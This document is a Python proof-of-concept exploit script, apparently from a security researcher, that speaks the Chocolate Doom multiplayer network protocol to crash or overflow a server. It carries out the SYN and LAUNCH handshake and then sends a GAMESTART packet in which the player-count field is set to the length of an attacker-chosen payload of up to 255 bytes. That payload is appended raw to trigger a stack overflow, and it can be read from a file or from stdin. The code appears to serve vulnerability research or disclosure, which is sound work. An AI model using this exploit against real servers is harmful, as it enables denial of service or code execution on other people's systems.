#!/usr/bin/python3
# vim: ts=4 et sw=4 sts=4 :

from enum import IntEnum
import argparse
import socket
import struct
import sys

# Matthias Gerstner
# SUSE Linux GmbH
# matthias.gerstner@suse.com

DEFPORT = 2342

PacketType = IntEnum("PacketType", [
        "SYN",
        "ACK",
        "REJECTED",
        "KEEPALIVE",
        "WAITING_DATA",
        "GAMESTART",
        "GAMEDATA",
        "GAMEDATA_ACK",
        "DISCONNECT",
        "DISCONNECT_ACK",
        "RELIABLE_ACK",
        "GAMEDATA_RESEND",
        "CONSOLE_MESSAGE",
        "QUERY",
        "QUERY_RESPONSE",
        "LAUNCH",
        "NAT_HOLE_PUNCH",
    ], start=0
)

MAGIC_NUMBER = 1454104972
RELIABLE_PACKET_FLAG = 1 << 15
CLIENT_ID = "Chocolate Doom 3.0.0"

GameMode = IntEnum("GameMode", [
        "shareware",
        "registered",
        "commercial",
        "retail",
        "indetermined"
    ], start=0
)

GameMission = IntEnum("GameMission", [
        "doom",
        "doom2",
        "pack_tnt",
        "pack_plut",
        "pack_chex",
        "pack_hacx",
        "heretic",
        "hexen",
        "strife",
        "none"
    ], start=0
)

PlayerClass = IntEnum("PlayerClass", [
        "FIGHTER",
        "CLERIC",
        "MAGE",
        "PIG"
    ], start=0
)

ProtocolStage = IntEnum("ProtocolStage", [
        "INIT",
        "SYN",
        "LAUNCH",
        "SETTINGS",
        "DONE"
    ]
)


# modelling of the net_connect_data_t from src/net_defs.h
class ConnectData:
    def __init__(self):
        self.gamemode = GameMode.shareware
        self.gamemission = GameMission.doom
        self.lowres_turn = 0
        self.drone = 0
        self.max_players = 4
        self.is_freedoom = 0
        self.wad_sha1sum = bytes(20)
        self.deh_sha1sum = bytes(20)
        self.player_class = PlayerClass.FIGHTER


class OutMessage:

    def __init__(self, ptype):
        self.clear()
        self.addInt16(ptype)

    def clear(self):
        self.m_msg = bytes()

    @classmethod
    def getUint32(cls, num):
        return struct.pack(">I", num)

    def addUint32(self, num):
        self.m_msg += self.getUint32(num)

    def prependUint32(self, num):
        self.m_msg = self.getUint32(num) + self.m_msg

    def addInt32(self, num):
        self.m_msg += struct.pack(">i", num)

    def addUint16(self, num):
        self.m_msg += struct.pack(">H", num)

    def addInt16(self, num):
        self.m_msg += struct.pack(">h", num)

    def addUint8(self, num):
        self.m_msg += bytes([num])

    def addInt8(self, num):
        self.m_msg += bytes([num])

    def addString(self, s):
        self.m_msg += s.encode()
        # null terminator
        self.addUint8(0)

    def addRaw(self, bts):
        self.m_msg += bts

    def addConnectData(self, data):
        self.addInt8(data.gamemode)
        self.addInt8(data.gamemission)
        self.addInt8(data.lowres_turn)
        self.addInt8(data.drone)
        self.addInt8(data.max_players)
        self.addInt8(data.is_freedoom)
        self.m_msg += data.wad_sha1sum
        self.m_msg += data.deh_sha1sum
        self.addInt8(data.player_class)

    def sendMessage(self, sock):
        sock.send(self.m_msg)


class InMessage:

    def __init__(self, msg):
        self.reset()
        self.m_msg = msg

    def reset(self):
        self.m_msg = bytes()
        self.m_pos = 0

    def parseUint32(self):
        data = self.getNextBytes(4)
        return struct.unpack(">I", data)[0]

    def parseInt16(self):
        data = self.getNextBytes(2)
        return struct.unpack(">h", data)[0]

    def parseUint16(self):
        data = self.getNextBytes(2)
        return struct.unpack(">H", data)[0]

    def parseUint8(self):
        data = self.getNextBytes(1)
        return data[0]

    def parseString(self):
        ret = ""
        while True:
            char = self.m_msg[self.m_pos]
            self.m_pos += 1
            if char == 0:
                break
            ret += chr(char)

        return ret

    def length(self):
        return len(self.m_msg)

    def getNextBytes(self, num):
        assert len(self.m_msg) - self.m_pos >= num
        data = self.m_msg[self.m_pos:self.m_pos + num]
        self.m_pos += num
        return data


class DoomExploiter:

    def __init__(self):
        self.parser = argparse.ArgumentParser()
        self.parser.add_argument("serveraddr", help="server hostname or IP address", type=str)
        self.parser.add_argument("--exploit", type=str,
            help="exploit data to use as stack overflow package. either a file path or '-' to read from stdin.")
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.stage = ProtocolStage.INIT

    def readExploit(self):
        if self.args.exploit == "-":
            # read from stdin
            self.args.exploit = sys.stdin.read()
        else:
            with open(self.args.exploit, 'rb') as fd:
                self.args.exploit = fd.read()

        MAXLEN = (1 << 8) - 1

        if len(self.args.exploit) > MAXLEN:
            print(f"Exploit is too large ({len(self.args.exploit)}), maximum length is {MAXLEN} bytes.",
                  file=sys.stderr)
            sys.exit(1)

    def setStage(self, stage):
        print(f"State change {self.stage.name} -> {stage.name}")
        self.stage = stage

    def sendSyn(self):
        msg = OutMessage(PacketType.SYN)
        msg.addInt32(MAGIC_NUMBER)
        msg.addString(CLIENT_ID)
        # write protocol list
        msg.addInt8(1)  # number of prots
        msg.addString("CHOCOLATE_DOOM_0")
        connect_data = ConnectData()
        msg.addConnectData(connect_data)
        msg.addString("hellish player")
        msg.sendMessage(self.s)

    def sendLaunch(self):
        msg = OutMessage(PacketType.LAUNCH)
        # no further parameters as it seems
        msg.sendMessage(self.s)

    def sendSettings(self):

        num_players = len(self.args.exploit)

        msg = OutMessage(PacketType.GAMESTART)
        msg.addUint8(0)  # ticdup
        msg.addUint8(0)  # extratics
        msg.addUint8(0)  # deathmatch
        msg.addUint8(0)  # no monsters
        msg.addUint8(0)  # fast monsters
        msg.addUint8(0)  # respawn monsters
        msg.addUint8(0)  # episode
        msg.addUint8(0)  # map (nr.?)
        msg.addUint8(0)  # skill
        msg.addUint8(0)  # game version
        msg.addUint8(0)  # lowres turn
        msg.addUint8(0)  # new sync
        msg.addUint32(15000)  # time limit
        msg.addUint8(0)  # load game
        msg.addUint8(0)  # random
        # THIS IS THE OVERFLOW ITEM #
        msg.addUint8(num_players)  # num players
        msg.addUint8(0)  # consoleplayer
        msg.addRaw(self.args.exploit)
        msg.sendMessage(self.s)

    def handleReliable(self, rawtype, msg):
        # this protocol supports some kind of ACK protocol where each sequence
        # number has to be ACKed, otherwise the server resends it all the time

        seq_nr = msg.parseUint8()

        ack = OutMessage(PacketType.RELIABLE_ACK)
        ack.addUint8(seq_nr & 0xff)
        ack.sendMessage(self.s)

        return rawtype & ~RELIABLE_PACKET_FLAG

    def processMsg(self, msg):
        #print("Received msg:", msg)
        msg = InMessage(msg)
        rawtype = msg.parseUint16()

        if rawtype & RELIABLE_PACKET_FLAG:
            rawtype = self.handleReliable(rawtype, msg)

        ptype = PacketType(rawtype)

        if ptype == PacketType.KEEPALIVE:
            #print("Keepalive message, ignoring")
            pass
        elif ptype == PacketType.SYN:
            if self.stage == ProtocolStage.SYN:
                package = msg.parseString()
                protocol = msg.parseString()
                print(f"Connected to {package} with protocol {protocol}")
                self.setStage(ProtocolStage.LAUNCH)
            else:
                # is send again and again for some reason
                pass
        elif ptype == PacketType.WAITING_DATA:
            # ignore this, it is coming at a regular interval to inform about
            # the game start pending
            pass
        else:
            print("received", ptype)

    def checkSendMsg(self):
        if self.stage == ProtocolStage.INIT:
            self.sendSyn()
            self.setStage(ProtocolStage.SYN)
        elif self.stage == ProtocolStage.LAUNCH:
            # only the "controlling" client can launch, but it should work
            # when we are the only client
            self.sendLaunch()
            self.setStage(ProtocolStage.SETTINGS)
        elif self.stage == ProtocolStage.SETTINGS:
            self.sendSettings()
            self.setStage(ProtocolStage.DONE)

    def run(self):
        self.args = self.parser.parse_args()
        if self.args.exploit:
            self.readExploit()
        else:
            # by default don't overflow the stack, use the actual maximum players
            # and a well defined sequence
            self.args.exploit = bytes([0, 1, 2, 3, 4, 5, 6, 7, 8])
        self.s.connect((self.args.serveraddr, DEFPORT))

        while True:
            self.checkSendMsg()
            msg = self.s.recv(1024)
            self.processMsg(msg)


if __name__ == '__main__':
    exploiter = DoomExploiter()
    exploiter.run()
